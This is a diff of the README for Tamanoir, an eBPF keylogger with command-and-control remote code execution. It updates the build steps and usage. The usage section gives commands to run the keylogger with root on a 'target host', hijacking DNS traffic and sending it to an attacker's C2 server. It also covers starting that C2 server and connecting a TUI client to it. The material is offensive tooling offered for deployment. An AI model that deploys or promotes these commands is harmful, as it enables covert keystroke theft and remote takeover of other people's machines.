@@ -1,5 +1,6 @@
 <div align="center">
-  <h1> Tamanoir <br> A KeyLogger using eBPF 🐝 </h1>
+  <h1> Tamanoir 
+  <h3> An eBPF🐝 keylogger with <br>C2-based RCE payload delivery  </h3><h1>
   <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 40%; height: 40%"</img>
   <p><small>
     <i>
@@ -31,29 +32,33 @@ To build from source, make sure you have:
 
 - [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
 - [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.
+- protobuf-compiler
 
 #### 1. Build ebpf program
 
 ```
-cd tamanoir-ebpf
-cargo build --release
+cd tamanoir-ebpf && cargo build --release
 ```
 
 #### 2. Build user space program
 
 ```
-cargo build --release
+cargo build -p tamanoir --release
 ```
 
-This will produce an executable file at `target/release/tamanoir` that you can copy to a directory in your `$PATH`
-
-#### 3. Build proxy program
+#### 3. Build C2 Server
 
 ```
-cargo build -p tamanoir-proxy --release
+cargo build -p tamanoir-c2 --release
 ```
 
-This will produce an executable file at `target/release/tamanoir-proxy` that you can copy to a directory in your `$PATH`
+#### 4. Build Tui Client
+
+```
+cargo build -p tamanoir-tui --release
+```
+
+These commands will produce  `tamanoir`, `tamanoir-c2` and `tamanoir-tui` executables  in `target/release` that you can add to your`$PATH`
 
 ### 📥 Binary release
 
@@ -64,12 +69,11 @@ You can download the pre-built binaries from the [release page](https://github.c
 ## 🪄 Usage
 
 ### Tamanoir
-
+🖥️ on target host:
 ```
 RUST_LOG=info sudo -E tamanoir \
-              --proxy-ip <DNS proxy IP> \
+              --proxy-ip <C2 server IP> \
               --hijack-ip <locally configured DNS server IP> \
-              --layout <keyboard layout> \
               --iface <network interface name>
 ```
 
@@ -77,40 +81,35 @@ for example:
 
 ```
 RUST_LOG=info sudo -E tamanoir \
-              --proxy-ip 192.168.1.75 \
+              --proxy-ip 192.168.1.15 \
               --hijack-ip 8.8.8.8 \
-              --layout 0 \
               --iface wlan0
 ```
 
-Currenly, there are two supported keyboard layouts:
 
-`0` : qwerty (us)
-
-`1` : azerty (fr)
 
 <br>
 
-### DNS Proxy
+### C2 Server
+🖥️ on your C2 server host:
 
+```
+sudo tamanoir-c2 start
+```
 > [!NOTE]
 > Make sure port 53 is available
 
-```
-RUST_LOG=info sudo -E tamanoir-proxy \
-              --port <port> \
-              --dns-ip <DNS server ip> \
-              --payload-len <payload length>
-```
+<br>
 
-for example:
+### Tui Client
+🖥️ wherever you want to use the client:
+
 
 ```
-RUST_LOG=info sudo -E tamanoir-proxy \
-              --port 53 \
-              --dns-ip 1.1.1.1 \
-              --payload-len 8
+tamanoir-tui -i  <C2 server IP> 
 ```
+> [!NOTE]
+> Make sure C2 server is reachable on port 50051
 
 <br>
 
@@ -122,9 +121,8 @@ RUST_LOG=info sudo -E tamanoir-proxy \
 
 ## ✍️ Authors
 
-[Badr Badri](https://github.com/pythops)
-
 [Adrien Gaultier](https://github.com/adgaultier)
+[Badr Badri](https://github.com/pythops)
 
 <br>
 
